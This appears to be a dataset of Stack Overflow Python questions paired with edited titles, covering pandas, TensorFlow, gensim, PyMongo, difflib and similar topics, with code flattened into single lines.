How can I determine if one list contains another in Python?," Is there a built-in Pythonic way to determine if one list completely contains the contents of another, including duplicated entries but disregarding the order of items? <code>  >>> l1 = [2, 2, 3]>>> l2 = [2, 2]>>> l3 = [3, 2]>>> l4 = [2, 2, 2]>>> l5 = [2, 5, 2]>>> is_superset(l1, l2)True>>> is_superset(l1, l3)True>>> is_superset(l1, l4)False>>> is_superset(l1, l5)False",How to determine if one list contains another?
Why isn't fillna finding all the Na/NaN in pandas?," I've seen this and this thread here, but something else is wrong.I have a very large pandas DataFrame, with many Na/NaN values. I want to replace them with the median value for that feature.So, I first make a table that displays the Na values per feature, sorted by most Na values, then use fillna(), and then display that table again. Ideally, the second time, that table should have all 0's, because all the Na's have been filled. However, I get these two tables:null count tables, before and afterand if I take a look at the DataFrame, you can see NaN's in it: NaN examplesIt seems like a common problem with fillna() is that it returns a copy, unless you use inplace=True (like in the linked threads above), but I'm not doing that: I'm overwriting TT_df, unless I'm misunderstanding something. You can see that the LotFrontage feature actually does disappear from the second table, implying that the fillna() did work for it. So why isn't it working for the others?What I suspect is the culprit, though I don't know why, is that Na doesn't actually mean Na for these features: if I look at the data description file, it says: GarageFinish: Interior finish of the garage Okay, that's fine. But it feels like those NA values should either count as Na for both isnull() and fillna(), or not count for either. Why does it appear to be counted by isnull() but not fillna()? <code>  nullCount = pd.DataFrame(TT_df.isnull().sum(),columns=[""nullcount""]).sort_values(by=""nullcount"",ascending=False)display(nullCount.head(10))TT_df = TT_df.fillna(TT_df.median())nullCount = pd.DataFrame(TT_df.isnull().sum(),columns=[""nullcount""]).sort_values(by=""nullcount"",ascending=False)display(nullCount.head(10)) display(TT_df[nullCount.index.tolist()[0:5]].head(50)) Fin Finished RFn Rough Finished Unf Unfinished NA No Garage",Why does fillna with median on dataframe still leaves Na/NaN in pandas?
How to make item item matrix with counting values in cells," I have a dataframe like this I want to get where a,b,c are column names, and I get the values counting '1' in all columns when the filter is '1' in another column.For ample, when df.a == 1, we count a = 2, b =1, c = 0 etc I made a loop to solve But I think that there is a simpler solution, isn't it? <code>  df = pd.DataFrame({'a' : [1,1,0,0], 'b': [0,1,1,0], 'c': [0,0,1,1]}) a b ca 2 1 0b 1 2 1c 0 1 2 matrix = []for name, values in df.iteritems(): matrix.append(pd.DataFrame( df.groupby(name, as_index=False).apply(lambda x: x[x == 1].count())).values.tolist()[1])pd.DataFrame(matrix)",Compute co-occurrence matrix by counting values in cells
Pandas contact increases number of rows," I'm concatenating two dataframes, so I want to one dataframe is located to another.But first I did some transformation to initial dataframe: And then concatenate: I dont know why, but number of rows increased: What happened and how fix the problem?As you can see number of columns for train equals to sum of columns real_data and categorial_data <code>  scaler = MinMaxScaler() real_data = pd.DataFrame(scaler.fit_transform(df[real_columns]), columns = real_columns) categorial_data = pd.get_dummies(df[categor_columns], prefix_sep= '__')train = pd.concat([real_data, categorial_data], axis=1, ignore_index=True) print(df.shape, real_data.shape, categorial_data.shape, train.shape)(1700645, 23) (1700645, 16) (1700645, 130) (1703915, 146)",Pandas Concat increases number of rows
Calculate overlap between polygon and shapefile in Python," I would like to calculate the percentage of overlap between a shapefile and a polygon. I'm using Cartopy and Matplotlib and created the map shown here:A part of Europe (using a shapefile downloaded here) and an arbitrary rectangle are shown. Let's say I would like to calculate the percentage of Belgium that is covered by the rectangle. How would I do this? Below, the code so far is shown. <code>  import matplotlib.pyplot as pltimport cartopy.crs as ccrsimport cartopy.io.shapereader as shapereaderfrom shapely.geometry import Polygonfrom descartes import PolygonPatch#create figurefig1 = plt.figure(figsize=(10,10)) PLT = plt.axes(projection=ccrs.PlateCarree())PLT.set_extent([-10,10,45,55])PLT.gridlines()#import and display shapefilefname = r'C:\Users\Me\ne_50m_admin_0_countries.shp'adm1_shapes = list(shapereader.Reader(fname).geometries())PLT.add_geometries(adm1_shapes, ccrs.PlateCarree(), edgecolor='black', facecolor='gray', alpha=0.5)#create arbitrary polygonx3 = 4x4 = 5y3 = 50y4 = 52poly = Polygon([(x3,y3),(x3,y4),(x4,y4),(x4,y3)])PLT.add_patch(PolygonPatch(poly, fc='#cc00cc', ec='#555555', alpha=0.5, zorder=5))",Calculate overlap between polygon and shapefile in Python 3.6
split lists within DataFrame column into multiple columns," I have a Pandas DataFrame column with multiple lists within a list. Something like this: I want to split the list over multiple columns so the output should be something like: Please help me with this. Thanks in advance  <code>  df col10 [[1,2], [2,3]]1 [[a,b], [4,5], [x,y]] 2 [[6,7]] col1 col2 col30 [1,2] [2,3] 1 [a,b] [4,5] [x,y]2 [6,7]",Split lists within dataframe column into multiple columns
Vectors from gensim word2vec in embedding projector," I've only seen a few questions that ask this, and none of them have an answer yet, so I thought I might as well try. I've been using gensim's word2vec model to create some vectors. I exported them into text, and tried importing it on tensorflow's live model of the embedding projector. One problem. It didn't work. It told me that the tensors were improperly formatted. So, being a beginner, I thought I would ask some people with more experience about possible solutions.Equivalent to my code: That creates the model, saves the vectors, and then prints the results out nice and pretty in a tab delimited file with values for all of the dimensions. I understand how to do what I'm doing, I just can't figure out what's wrong with the way I put it in tensorflow, as the documentation regarding that is pretty scarce as far as I can tell.One idea that has been presented to me is implementing the appropriate tensorflow code, but I dont know how to code that, just import files in the live demo. Edit: I have a new problem now. The object I have my vectors in is non-iterable because gensim apparently decided to make its own data structures that are non-compatible with what I'm trying to do. Ok. Done with that too! Thanks for your help! <code>  import gensimcorpus = [[""words"",""in"",""sentence"",""one""],[""words"",""in"",""sentence"",""two""]]model = gensim.models.Word2Vec(iter = 5,size = 64)model.build_vocab(corpus)# save memoryvectors = model.wvdel modelvectors.save_word2vec_format(""vect.txt"",binary = False)",Visualize Gensim Word2vec Embeddings in Tensorboard Projector
Visualize Word2vec Embeddings in Tensorboard Projector," I've only seen a few questions that ask this, and none of them have an answer yet, so I thought I might as well try. I've been using gensim's word2vec model to create some vectors. I exported them into text, and tried importing it on tensorflow's live model of the embedding projector. One problem. It didn't work. It told me that the tensors were improperly formatted. So, being a beginner, I thought I would ask some people with more experience about possible solutions.Equivalent to my code: That creates the model, saves the vectors, and then prints the results out nice and pretty in a tab delimited file with values for all of the dimensions. I understand how to do what I'm doing, I just can't figure out what's wrong with the way I put it in tensorflow, as the documentation regarding that is pretty scarce as far as I can tell.One idea that has been presented to me is implementing the appropriate tensorflow code, but I dont know how to code that, just import files in the live demo. Edit: I have a new problem now. The object I have my vectors in is non-iterable because gensim apparently decided to make its own data structures that are non-compatible with what I'm trying to do. Ok. Done with that too! Thanks for your help! <code>  import gensimcorpus = [[""words"",""in"",""sentence"",""one""],[""words"",""in"",""sentence"",""two""]]model = gensim.models.Word2Vec(iter = 5,size = 64)model.build_vocab(corpus)# save memoryvectors = model.wvdel modelvectors.save_word2vec_format(""vect.txt"",binary = False)",Visualize Gensim Word2vec Embeddings in Tensorboard Projector
Python Look Up Table," I am using python to automate a piezoelectric droplet generator. For each value of a pulse length, a suitable value of voltage will be there to produce a signal to give away a droplet. This value of voltage keeps changing in every run(for example, + or -10). So I have a database of different value of voltages for every pulse length. I would like to know some things about using lookup tables in python. For my task, I want to pick a random pulse length from 15 to 70, and associate this value with a particular range of voltages from the database (for example: for a value 17, I would like the program to access the lookup table and return a range of voltages 35-50). Is it possible to take the entire range and not just a single value. Since, I am new to coding and python, I am not really sure. Any help is welcome. Thank you. <code> ",Using Look Up Tables in Python
Basic python program freezes on windows 10," This is the basic Python example from https://docs.python.org/2/library/multiprocessing.html#module-multiprocessing.pool on parallel processing which I can't run for some reason on my PC. When I try to execute the third block the program freezes. My OS is Windows 10. I run the program on the Spyder IDE and I have an anaconda installation. What is possibly the problem? <code>  from multiprocessing import Pooldef f(x): return x*xif __name__ == '__main__': p = Pool(5) print(p.map(f, [1, 2, 3]))",Basic parallel python program freezes on Windows
PyMongo: Filter results using lookup," I have a piece of code to join collection A (sample) to collection B (locators). I've tried the $unwind, $group and $push syntax the only problem is that I can't return the field locator and record. Which returns attempt 1 Which returns: Expected result should be: <code>  data = db.sample.aggregate([{'$lookup': { 'from': 'locators', 'localField': ""locator"", 'foreignField': ""_id"", 'as': ""metalocator""}}])print(list(data)) [ { '_id': '599A65E1A80541BA', 'locator': 'ABC', 'record': 'Nicaragua', 'metalocator': [{'_id': 'ABC', 'group': 'Location', 'section': 'Geo', 'cabinet': 'Country', 'record': 'string', 'status': 'integer'}] }, { '_id': '428E970995AE8C76', 'locator': 'CDE', 'record': 'Nigeria', 'metalocator': [{'_id': 'CDE', 'group': 'Location', 'section': 'Geo', 'cabinet': 'Country', 'record': 'string', 'status': 'integer'}] }] data = db.sample.aggregate([ {""$lookup"": {""from"": ""locators"", ""localField"": ""locator"", ""foreignField"": ""_id"", ""as"": ""metalocator""}}, {""$unwind"": '$metalocator'}, {""$group"": {""_id"": ""$_id"", ""metalocator"": {""$push"": { ""section"": ""$metalocator.section"", ""cabinet"": ""$metalocator.cabinet""}}}}])print(list(data)) [ { '_id': '1835853D2982AAEF', 'metalocator': [{'section': 'Geo', 'cabinet': 'Country'}] }, { '_id': '428E970995AE8C76', 'metalocator': [{'section': 'Geo', 'cabinet': 'Country'}] }] [ { '_id': '1835853D2982AAEF', 'locator': 'ABC', 'record': 'Nicaragua', 'metalocator': [{'section': 'Geo', 'cabinet': 'Country'}] }, { '_id': '428E970995AE8C76', 'locator': 'CDE', 'record': 'Nigeria', 'metalocator': [{'section': 'Geo', 'cabinet': 'Country'}] }]",Select fields to return from $lookup
Dividing each row by the previous one (pandas)," I have pandas dataframe: I want, for each city, to divide each row by the previous one and write the result into a new dataframe. The desired output is: What's the most pythonic way to do this? <code>  df = pd.DataFrame()df['city'] = ['NY','NY','LA','LA']df['hour'] = ['0','12','0','12']df['value'] = [12,24,3,9] city hour value0 NY 0 121 NY 12 242 LA 0 33 LA 12 9 city ratioNY 2LA 3",Dividing each row by the previous one
"Python: why is this singleton implementation ""not thread safe""?"," 1. The @Singleton decoratorI found an elegant way to decorate a Python class to make it a singleton. The class can only produce one object. Each Instance() call returns the same object: I found the code here:Is there a simple, elegant way to define singletons?The comment at the top says: [This is] a non-thread-safe helper class to ease implementing singletons.Unfortunately, I don't have enough multithreading experience to see the 'thread-unsafeness' myself. 2. QuestionsI'm using this @Singleton decorator in a multithreaded Python application. I'm worried about potential stability issues. Therefore:Is there a way to make this code completely thread-safe?If the previous question has no solution (or if its solution is too cumbersome), what precautions should I take to stay safe?@Aran-Fey pointed out that the decorator is badly coded. Any improvements are of course very much appreciated.Hereby I provide my current system settings:    >  Python 3.6.3    >  Windows 10, 64-bit <code>  class Singleton: """""" A non-thread-safe helper class to ease implementing singletons. This should be used as a decorator -- not a metaclass -- to the class that should be a singleton. The decorated class can define one `__init__` function that takes only the `self` argument. Also, the decorated class cannot be inherited from. Other than that, there are no restrictions that apply to the decorated class. To get the singleton instance, use the `Instance` method. Trying to use `__call__` will result in a `TypeError` being raised. """""" def __init__(self, decorated): self._decorated = decorated def Instance(self): """""" Returns the singleton instance. Upon its first call, it creates a new instance of the decorated class and calls its `__init__` method. On all subsequent calls, the already created instance is returned. """""" try: return self._instance except AttributeError: self._instance = self._decorated() return self._instance def __call__(self): raise TypeError('Singletons must be accessed through `Instance()`.') def __instancecheck__(self, inst): return isinstance(inst, self._decorated)","Why is this singleton implementation ""not thread safe""?"
How to export a TensorFlow model as a .tflite file?," Background information:I have written a TensorFlow model very similar to the premade iris classification model provided by TensorFlow. The differences are relatively minor: I am classifying football exercises, not iris species.I have 10 features and one label, not 4 features and one label.I have 5 different exercises, as opposed to 3 iris species.My trainData contains around 3500 rows, not only 120.My testData contains around 330 rows, not only 30.I am using a DNN classifier with n_classes=6, not 3.I now want to export the model as a .tflite file. But according to the TensorFlow Developer Guide, I need to first export the model to a tf.GraphDef file, then freeze it and only then will I be able to convert it. However, the tutorial provided by TensorFlow to create a .pb file from a custom model only seems to be optimized for image classification models. Question:So how do I convert a model like the iris classification example model into a .tflite file? Is there an easier, more direct way to do it, without having to export it to a .pb file, then freeze it and so on? An example based on the iris classification code or a link to a more explicit tutorial would be very useful!Other information:OS: macOS 10.13.4 High SierraTensorFlow Version: 1.8.0Python Version: 3.6.4Using PyCharm Community 2018.1.3Code:The iris classification code can be cloned by entering the following command:git clone https://github.com/tensorflow/modelsBut in case you don't want to download the whole package, here it is:This is the classifier file called premade_estimator.py: And this is the data file called iris_data.py: ** UPDATE **Ok so I have found a seemingly very useful piece of code on this page: This little guy directly converts a simple model to a TensorFlow Lite Model. Now all I have to do is find a way to adapt this to the iris classification model. Any suggestions? <code>  # Copyright 2016 The TensorFlow Authors. All Rights Reserved. # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. """"""An Example of a DNNClassifier for the Iris dataset."""""" from __future__ import absolute_import from __future__ import division from __future__ import print_function import argparse import tensorflow as tf import iris_data parser = argparse.ArgumentParser() parser.add_argument('--batch_size', default=100, type=int, help='batch size') parser.add_argument('--train_steps', default=1000, type=int, help='number of training steps') def main(argv): args = parser.parse_args(argv[1:]) # Fetch the data (train_x, train_y), (test_x, test_y) = iris_data.load_data() # Feature columns describe how to use the input. my_feature_columns = [] for key in train_x.keys(): my_feature_columns.append(tf.feature_column.numeric_column(key=key)) # Build 2 hidden layer DNN with 10, 10 units respectively. classifier = tf.estimator.DNNClassifier( feature_columns=my_feature_columns, # Two hidden layers of 10 nodes each. hidden_units=[10, 10], # The model must choose between 3 classes. n_classes=3) # Train the Model. classifier.train( input_fn=lambda: iris_data.train_input_fn(train_x, train_y, args.batch_size), steps=args.train_steps) # Evaluate the model. eval_result = classifier.evaluate( input_fn=lambda: iris_data.eval_input_fn(test_x, test_y, args.batch_size)) print('\nTest set accuracy: {accuracy:0.3f}\n'.format(**eval_result)) # Generate predictions from the model expected = ['Setosa', 'Versicolor', 'Virginica'] predict_x = { 'SepalLength': [5.1, 5.9, 6.9], 'SepalWidth': [3.3, 3.0, 3.1], 'PetalLength': [1.7, 4.2, 5.4], 'PetalWidth': [0.5, 1.5, 2.1], } predictions = classifier.predict( input_fn=lambda: iris_data.eval_input_fn(predict_x, labels=None, batch_size=args.batch_size)) template = '\nPrediction is ""{}"" ({:.1f}%), expected ""{}""' for pred_dict, expec in zip(predictions, expected): class_id = pred_dict['class_ids'][0] probability = pred_dict['probabilities'][class_id] print(template.format(iris_data.SPECIES[class_id], 100 * probability, expec)) if __name__ == '__main__': # tf.logging.set_verbosity(tf.logging.INFO) tf.app.run(main) import pandas as pd import tensorflow as tf TRAIN_URL = ""http://download.tensorflow.org/data/iris_training.csv"" TEST_URL = ""http://download.tensorflow.org/data/iris_test.csv"" CSV_COLUMN_NAMES = ['SepalLength', 'SepalWidth', 'PetalLength', 'PetalWidth', 'Species'] SPECIES = ['Setosa', 'Versicolor', 'Virginica'] def maybe_download(): train_path = tf.keras.utils.get_file(TRAIN_URL.split('/')[-1], TRAIN_URL) test_path = tf.keras.utils.get_file(TEST_URL.split('/')[-1], TEST_URL) return train_path, test_path def load_data(y_name='Species'): """"""Returns the iris dataset as (train_x, train_y), (test_x, test_y)."""""" train_path, test_path = maybe_download() train = pd.read_csv(train_path, names=CSV_COLUMN_NAMES, header=0) train_x, train_y = train, train.pop(y_name) test = pd.read_csv(test_path, names=CSV_COLUMN_NAMES, header=0) test_x, test_y = test, test.pop(y_name) return (train_x, train_y), (test_x, test_y) def train_input_fn(features, labels, batch_size): """"""An input function for training"""""" # Convert the inputs to a Dataset. dataset = tf.data.Dataset.from_tensor_slices((dict(features), labels)) # Shuffle, repeat, and batch the examples. dataset = dataset.shuffle(1000).repeat().batch(batch_size) # Return the dataset. return dataset def eval_input_fn(features, labels, batch_size): """"""An input function for evaluation or prediction"""""" features = dict(features) if labels is None: # No labels, use only features. inputs = features else: inputs = (features, labels) # Convert the inputs to a Dataset. dataset = tf.data.Dataset.from_tensor_slices(inputs) # Batch the examples assert batch_size is not None, ""batch_size must not be None"" dataset = dataset.batch(batch_size) # Return the dataset. return dataset import tensorflow as tf img = tf.placeholder(name=""img"", dtype=tf.float32, shape=(1, 64, 64, 3)) val = img + tf.constant([1., 2., 3.]) + tf.constant([1., 4., 4.]) out = tf.identity(val, name=""out"") with tf.Session() as sess: tflite_model = tf.contrib.lite.toco_convert(sess.graph_def, [img], [out]) open(""test.tflite"", ""wb"").write(tflite_model)",How do I export a TensorFlow model as a .tflite file?
Combining map with zip," I'm trying to write a function for adding 2D vectors. I'm trying to combine the map() function, getting a list using the zip() function (which will zip 2 tuples).This is the code: So the way I see it, zip(a, b) returns a zip object containing the following tuples: (1, 3), (2, 4). It is then converted to a list. I'm getting the following error: TypeError: () missing 1 required positional argument: 'y'So my guess is that the lambda function is not taking the second number in each tuple.Is there any way to do this?  <code>  a = (1, 2)b = (3, 4)c = list(map(lambda x, y: x+y, list(zip(a, b))))print(c)",Combining map with zip through lambda
Who are X_train and y_train in .fit()," I want to start develop an application using Machine Learning. I want to classify text - spam or not spam. I have 2 files - spam.txt, ham.txt - that contain thousand of sentences each file. If I want to use a classifier, let's say LogisticRegression.For example, as I saw on the Internet, to fit my model I need to do like this: So here comes my question, what are actually X_train and y_train? How can I obtain them from my sentences? I searched on the Internet, I did not understand, here is my last call, I am pretty new to this topic. Thank you! <code>  `lr = LogisticRegression()model = lr.fit(X_train, y_train)`",What are X_train and y_train?
Compute true- and false-positive rate for multi-class data," How do you compute the true- and false- positive rates of a multi-class classification problem? Say, The confusion matrix is computed by metrics.confusion_matrix(y_true, y_prediction), but that just shifts the problem.EDIT after @seralouk's answer. Here, the class -1 is to be considered as the negatives, while 0 and 1 are variations of positives. <code>  y_true = [1, -1, 0, 0, 1, -1, 1, 0, -1, 0, 1, -1, 1, 0, 0, -1, 0]y_prediction = [-1, -1, 1, 0, 0, 0, 0, -1, 1, -1, 1, 1, 0, 0, 1, 1, -1]","True Positive Rate and False Positive Rate (TPR, FPR) for Multi-Class Data in python"
"Compute True and False Positive Rate (TPR, FPR) for multi-class data"," How do you compute the true- and false- positive rates of a multi-class classification problem? Say, The confusion matrix is computed by metrics.confusion_matrix(y_true, y_prediction), but that just shifts the problem.EDIT after @seralouk's answer. Here, the class -1 is to be considered as the negatives, while 0 and 1 are variations of positives. <code>  y_true = [1, -1, 0, 0, 1, -1, 1, 0, -1, 0, 1, -1, 1, 0, 0, -1, 0]y_prediction = [-1, -1, 1, 0, 0, 0, 0, -1, 1, -1, 1, 1, 0, 0, 1, 1, -1]","True Positive Rate and False Positive Rate (TPR, FPR) for Multi-Class Data in python"
"Compute True and False Positive Rate (TPR, FPR) for Multi-Class Data"," How do you compute the true- and false- positive rates of a multi-class classification problem? Say, The confusion matrix is computed by metrics.confusion_matrix(y_true, y_prediction), but that just shifts the problem.EDIT after @seralouk's answer. Here, the class -1 is to be considered as the negatives, while 0 and 1 are variations of positives. <code>  y_true = [1, -1, 0, 0, 1, -1, 1, 0, -1, 0, 1, -1, 1, 0, 0, -1, 0]y_prediction = [-1, -1, 1, 0, 0, 0, 0, -1, 1, -1, 1, 1, 0, 0, 1, 1, -1]","True Positive Rate and False Positive Rate (TPR, FPR) for Multi-Class Data in python"
How to create new column in Pandas with condition to reapeat ntime a value of another column?," I'm beginner in Python, I have a big DataFrame which looks like that: Output: I want to have something like that: I dont know how I can create a new column with a condition to repeat Type ntime as the number of Count. Thanks! <code>  import pandas as pddf = pd.DataFrame({'Total': [10, 10, 10, 10, 10, 10, 10, 10, 10, 10], \ 'Type': ['Child', 'Boy', 'Girl', 'Senior', '', '', '', '', '', ''], \ 'Count': [4, 5, 1, 0, '', '', '', '', '', '']})df[[""Total"", ""Type"", ""Count""]]df Total Type Count0 10 Child 41 10 Boy 52 10 Girl 13 10 Senior 04 10 5 10 6 10 7 10 8 10 9 10 Total Type Count New0 10 Child 4 Child1 10 Boy 5 Child2 10 Girl 1 Child3 10 Senior 0 Child4 10 Boy5 10 Boy6 10 Boy7 10 Boy8 10 Boy9 10 Girl",How to create new column in Pandas with condition to repeat by a value of another column?
Is there a better/more efficient way to do this (vectorised)?," So in R, I'd use an optimized apply function for this, but I've read now that the Panda's apply function is an abstracted loop and is perhaps even slower than one, and it shows in the performance. On my machine, it took 30 mins to process 60k rows. So essentially I'm looking to calculate a moving average based on a dataset with different groups on which I need to calculate a moving average. There are a lot of these groups. So I essentially first have to subset the dataset on a row/cell-wise basis, and only then calculate the moving average. So I'm trying to come up with a vectorised solution to this but can't seem to figure how you'd go about subsetting the dataframe within a vectorised approach. My current solution makes use of an apply function which is really easy to understand and maintain: This is my expected output (which I am currently getting but just very very slowly):This is the dataframe and this example I want the moving average over two timepoints, ""t"" in this example: <code>  df['SMA'] = df.apply(SMA, axis=1)def SMA(row): Subset = df[(df['group']==row['group'])&(df['t']<=row['t'])].reset_index() Subset2 = Subset[len(Subset.index)-(2):len(Subset.index)] return df['val'].mean() t group val moving average1 A 1 NA2 A 2 1.53 A 3 2.51 B 4 NA2 B 5 4.53 B 6 5.51 C 7 NA2 C 8 7.53 C 9 8.5",Is there a better/more efficient way to do this (vectorised)? Very slow performance with Pandas apply
Keras: How to slice tensor using infromation from another tensor?," I am trying to implement a custom loss function and have come across this problem. The custom loss function will look something like this: In my situation, y_pred and y_true are actually greyscale images. The features contained in z[2] consists of a pair of locations (x,y) where I would like to compare y_pred and y_true. These locations depend on the input training sample, so when defining the model they are passed as inputs. So my question is: how do I use the tensor features to index into the tensors y_pred and y_true? <code>  def customLoss(z): y_pred = z[0] y_true = z[1] features = z[2] ... return loss",Keras: How to slice tensor using information from another tensor?
Is there any pytorch function can combine the specific dimensions of tensor into one?," Let's call the function I'm looking for ""magic_combine"", which can combine the continuous dimensions of tensor I give to it. For more specific, I want it to do the following thing: I know that torch.view() can do the similar thing. But I'm just wondering if there is any more elegant way to achieve the goal?  <code>  a = torch.zeros(1, 2, 3, 4, 5, 6) b = a.magic_combine(2, 5) # combine dimension 2, 3, 4 print(b.size()) # should be (1, 2, 60, 6)",Is there any pytorch function can combine the specific continuous dimensions of tensor into one?
Python Difflib's SequenceMatcher: Did I find a bug?," I want to use difflib.SequenceMatcher to extract longest common substrings from two strings. I'm not sure whether I found a bug or misunderstood the documentation of find_longest_match. This is the point that I find confusing: In other words, of all maximal matching blocks, return one that starts earliest in a, and of all those maximal matching blocks that start earliest in a, return the one that starts earliest in b.(https://docs.python.org/3.5/library/difflib.html#difflib.SequenceMatcher.find_longest_match)Comparing the strings X this is a test and this is a test X, the substring X is in fact a maximal block: it can't be extended (i.e., it is inclusion-maximal). Also, it is the first such maximal block in text A. But it is certainly not a longest common substring. I strongly suspect this is not what find_longest_match is supposed to find.In fact, in this example, find_longest_match does find a longest common substring: However, it seems like with some other strings, I can provoke the ""find the first maximal block""-behavious described above (sorry for the long strings, if I shorten them, the example somehow breaks): In this case, it matches the first - in s1[1] to the - in s2[47], and that's it. A longest common substring would probably be something starting with graph visualization usingDid I find a bug, or is there another possible interpretation of the documentation that describes this behavior?I'm using Python 3.5.2 on Ubuntu. <code>  >>> l = len(""X this is a test"")>>> matcher = difflib.SequenceMatcher(None, ""X this is a test"", ""this is a test X"")>>> matcher.find_longest_match(0, l, 0, l)Match(a=2, b=0, size=14) >>> s1 = ""e-like graph visualization using a spanning tree-driven layout technique with constraints specified by layers and the ordering of groups of nodes within layers. We propose a new method of how the orde"">>> s2 = ""itree graph visualization using a spanning tree-driven layout technique with constraints speci ed by layers and the ordering of groups of nodes within layers. We propose a new method of how the drivin"">>> matcher = difflib.SequenceMatcher(None, s1, s2)>>> matcher.find_longest_match(1, 149, 5, 149)Match(a=1, b=47, size=1)",Python Difflib's SequenceMatcher does not find Longest Common Substrings
How to make a python variable persist between chunk in a markdown notebook?," Variable are not retained from one chunk to the next in notebook mode, but they are retained when knitting the markdown document to html.I made a sample document available as a gist called pythonvariables.Rmd, the content of this file is: In Rstudio version 1.1.453, in notebook mode, when running one chunk after the other, the output of the print(x) python chunk is: However the issue doesn't appear when the Rmd is compiled to html. The output of the print(x) python chunk is 1 as expected. <code>  ---title: ""R Notebook""output: html_document: df_print: paged---```{r setup, include=FALSE}knitr::opts_chunk$set(echo = TRUE)library(reticulate)``````{python}x = 1 ``````{python}print(x)``````{r}print(py$x)``` Traceback (most recent call last): File ""C:\Users\rougipa\AppData\Local\Temp\2\RtmpQFW3Rj\chunk-code-1d44920f50.txt"", line 1, in <module> print(x)NameError: name 'x' is not defined",How to make a python variable persist between chunks in a markdown notebook?
Save an image in folder python using py.image.save_as," I would like to save the plot images I generate into a specific directory, but save_as only has a filename argument.I'm using the following code to save the plotspy.image.save_as(fig,filename='T_avg_'+lst_QoST_prop[i]+'.pdf')Is there a way to specify a directory? <code> ",How to specify a directory in which to save an image using plotly py.image.save_as
"need to reverse the strings contained in each pair of matching parentheses, starting from the innermost pair"," So far I have done this. I am stuck on recursion. I have no idea how to move forward, joining and reversing etc. EXPECTED OUTPUT : ""apmnolkjihgfedcbq"" <code>  def callrecursion(s): a=s.index('(') z=len(s) - string[::-1].index(')') -1 newStr=s[a+1:z]# Something is missing here i cant figure it out print(newStr) return newStrdef reverseParentheses(s): if '(' in s: return reverseParentheses(callrecursion(s)) print('wabba labba dub dub') else: return sstring='a(bcdefghijkl(mno)p)q'reverseParentheses(string)","How do I reverse the strings contained in each pair of matching parentheses, starting from the innermost pair? CodeFights"
"How do I reverse the strings contained in each pair of matching parentheses, starting from the innermost pair?"," So far I have done this. I am stuck on recursion. I have no idea how to move forward, joining and reversing etc. EXPECTED OUTPUT : ""apmnolkjihgfedcbq"" <code>  def callrecursion(s): a=s.index('(') z=len(s) - string[::-1].index(')') -1 newStr=s[a+1:z]# Something is missing here i cant figure it out print(newStr) return newStrdef reverseParentheses(s): if '(' in s: return reverseParentheses(callrecursion(s)) print('wabba labba dub dub') else: return sstring='a(bcdefghijkl(mno)p)q'reverseParentheses(string)","How do I reverse the strings contained in each pair of matching parentheses, starting from the innermost pair? CodeFights"
Python 3.7: dataclass seems to be ignoring argument `eq`," I was trying out the new dataclasses in Python 3.7The dataclass decorator can be passed arguments to control the dunder functions that are added to the class.For some reason, the decorator does not seem to raise TypeError for eq=False argument.As per the docs: If I understand correctly, if i pass eq = False, __eq__ function will not be added, and a TypeError should be thrown when comparing two instances of the same class. Instead, the eq parameter seems to have no effect. The above does not raise TypeError and always evaluates to False. The other arguments(eg: order, repr) seem to behave as expected Is there some gap in my understanding?I am using docker image python/rc-stretch <code>  eq: If true (the default), an __eq__ method will be generated. This method compares the class as if it were a tuple of its fields, in order. Both instances in the comparison must be of the identical type @dataclass(eq = False)class Number: val: inta = Number(1)b = Number(2)c = Number(1)a == bFalsea == cFalse @dataclass()class Number: val: inta = Number(1)b = Number(2)c = Number(1)aNumber(val = 1)a == bFalsea == cTrue @dataclass(order = False, repr = False)class Number: val:inta = Number(1)b = Number(2)c = Number(1)a<__main__.Number object at 0x7fe1036c8b38>a < bTraceback (most recent call last): File ""<stdin>"", line 1, in <module> TypeError: '<' not supported between instances of 'Number' and 'Number' ",Python 3.7: dataclass does not raise `TypeError` for `eq=False`
how to suppress Catboost iteration results?," I am trying to use CatBoost to fit a binary model. When I use the following code, I thought verbose=False can help to suppress the iteration logs. But it didn't. Is there a way to avoid print the iterations?  <code>  model=CatBoostClassifier(iterations=300, depth=6, learning_rate=0.1, loss_function='Logloss', rsm = 0.95, border_count = 64, eval_metric = 'AUC', l2_leaf_reg= 3.5, one_hot_max_size=30, use_best_model = True, verbose=False, random_seed = 502)model.fit(X_train, y_train, eval_set=(X_test_filtered, y_test_num), verbose = False, plot=True)",How to suppress CatBoost iteration results?
Retreving facets and point from VTK file in python," I have a vtk file containing a 3d model,I would like to extract the point coordinates and the facets.Here is a minimal working example: This works as numpy_nodescontains the x,y,z coordinates of all points, but I am at loss to retrieve the list that relates the facets of this model to the corresponding points.I tried: But then numpy_nodes is just a 1D array where I would expect a 2D array (size 3*number of facets) where the first dimension contains the number of the corresponding points to the facet (as in a .ply file).Any advise on how to proceed would be welcome <code>  import vtkimport numpyfrom vtk.util.numpy_support import vtk_to_numpyreader = vtk.vtkPolyDataReader()reader.SetFileName('test.vtk')reader.Update()polydata = reader.GetOutput()points = polydata.GetPoints()array = points.GetData()numpy_nodes = vtk_to_numpy(array) facets= polydata.GetPolys()array = facets.GetData()numpy_nodes = vtk_to_numpy(array)",Retrieving facets and point from VTK file in python
How to convert a black and white image to big array of numbers?," Like the image above suggests, how can I convert the image to the left into an array that represent the darkness of the image between 0 for white and decimals for darker colours closer to 1? as shown in the image usingpython 3`? Update:I have tried to work abit more on this. There are good answers below too. <code>  # Load image filename = tf.constant(""one.png"")image_file = tf.read_file(filename)# Show ImageImage(""one.png"")#convert methoddef convertRgbToWeight(rgbArray): arrayWithPixelWeight = [] for i in range(int(rgbArray.size / rgbArray[0].size)): for j in range(int(rgbArray[0].size / 3)): lum = 255-((rgbArray[i][j][0]+rgbArray[i][j][1]+rgbArray[i][j][2])/3) # Reversed luminosity arrayWithPixelWeight.append(lum/255) # Map values from range 0-255 to 0-1 return arrayWithPixelWeight# Convert image to numbers and print themimage_decoded_png = tf.image.decode_png(image_file,channels=3)image_as_float32 = tf.cast(image_decoded_png, tf.float32)numpy.set_printoptions(threshold=numpy.nan)sess = tf.Session()squeezedArray = sess.run(image_as_float32)convertedList = convertRgbToWeight(squeezedArray)print(convertedList) # This will give me an array of numbers. ",Convert a black and white image to array of numbers?
